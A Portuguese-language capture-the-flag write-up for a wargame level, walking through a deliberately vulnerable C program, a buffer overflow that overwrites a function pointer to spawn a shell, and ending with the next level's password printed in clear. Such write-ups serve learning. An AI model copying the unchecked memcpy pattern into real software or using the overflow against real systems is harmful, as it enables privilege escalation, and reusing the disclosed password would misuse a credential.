# ~ Level 03 ~

```
cd /levels
./level3
~NADA ACONTECE...~
ls -la
ls -la
total 576
...
-r-sr-x---  1 level4  level3   5238 Sep 22  2012 level03
-r--------  1 level3  level3    658 Sep 22  2012 level03.c
...
```

Assim como o nível 2, parece que temos o código fonte do level03 disponível.

```
cat level03.c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

Desta vez, parece que necessitaremos de certo conhecimento acerca de gerenciamento de memória.

Precisamos de um argumento (argc != 2) e este argumento deve ter mais que 4 caracteres, sendo que o *buffer* suporta no máximo 50 bytes.

Devemos colocar em mente, também, que o software usa *memcpy* e *memset*.

Vamos observar o comportamento do software funcionalmente.

```
./level03 123123123123123
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
./level03 123123123123123123123123123123123
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

Note que mesmo para entradas de tamanhos diferentes, o endereço de memória é o mesmo.

Isto nos informa que necessitaremos de uma abordagem um pouco mais complexa.

O que acontece se estourarmos o buffer?

```
./level03 123123123123123123123123123123123123123123123123123123123123123123123123123123
This is exciting we're going to 0x8043332
Segmentation fault
```

Um SEGFAULT! Note também que o endereço de memória alterou, e isto causou o SEGFAULT.

E se manipularmos nossa string até alcançar o 0x8048474?

```
./level03 12312312312312312312312312312312312312312312312312312312312312312312312312312
This is exciting we're going to 0x8048432
level3@io:/levels$ ./level03 1231231231231231231231231231231231231231231231231231231231231231231231231231
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:/levels$ ./level03 12312312312312312312312312312312312312312312312312312312312312312312312312319
This is exciting we're going to 0x8048439
level3@io:/levels$ ./level03 1231231231231231231231231231231231231231231231231231231231231231231231231231z
This is exciting we're going to 0x804847a
Win.
sh-4.3$
```

Conseguimos!

```
cat /home/level4/.pass
7WhHa5HWMNRAYl9T
```
